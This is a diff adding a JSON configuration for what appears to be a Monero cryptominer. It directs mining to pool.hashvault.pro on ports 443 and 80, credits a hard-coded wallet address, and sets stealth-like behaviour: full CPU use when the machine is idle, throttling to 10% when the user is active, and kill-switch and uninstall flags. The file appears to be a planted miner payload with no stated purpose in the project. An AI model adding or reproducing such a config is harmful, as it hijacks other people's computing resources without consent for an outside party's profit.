@@ -1,0 +1,56 @@
+{
+  "autosave": true,
+  "version": 2,
+  "background": false,
+  "colors": true,
+  "randomx": {
+    "init": -1,
+    "mode": "auto",
+    "bfmt": [1, 0, 0, 3, 1, 4, 0, 0, 1, 1]
+  },
+  "cpu": {
+    "enabled": true,
+    "huge_pages": true,
+    "hw_aes": null,
+    "priority": 1,
+    "asm": "auto",
+    "max-threads-hint": 100
+  },
+  "pools": [
+    {
+      "url": "pool.hashvault.pro:443",
+      "user": "48fFfY8jbWs6jrokjo3WMyiihNNZncJ94cCDZMcBALTSZbNRW5YuTyzVTR3NFn39U3CKSfKmmQTCw4dMZgMwrWHyPyuzEbg",
+      "pass": "worker1",
+      "tls": true,
+      "keepalive": true,
+      "coin": "monero"
+    },
+    {
+      "url": "pool.hashvault.pro:80",
+      "user": "48fFfY8jbWs6jrokjo3WMyiihNNZncJ94cCDZMcBALTSZbNRW5YuTyzVTR3NFn39U3CKSfKmmQTCw4dMZgMwrWHyPyuzEbg",
+      "pass": "worker1",
+      "tls": false,
+      "keepalive": true,
+      "coin": "monero"
+    }
+  ],
+  "api": {
+    "port": 0,
+    "access-key": null,
+    "ipv6": false,
+    "restricted": true
+  },
+  "wallet": "48fFfY8jbWs6jrokjo3WMyiihNNZncJ94cCDZMcBALTSZbNRW5YuTyzVTR3NFn39U3CKSfKmmQTCw4dMZgMwrWHyPyuzEbg",
+  "pool": "pool.hashvault.pro:443",
+  "poolBackup": "pool.hashvault.pro:80",
+  "tls": true,
+  "idleCpu": 100,
+  "activeCpu": 10,
+  "idleThreshold": 120,
+  "donateLevel": 0,
+  "wrmsr": true,
+  "hugePages": true,
+  "killSwitch": false,
+  "paused": false,
+  "uninstall": false
+}
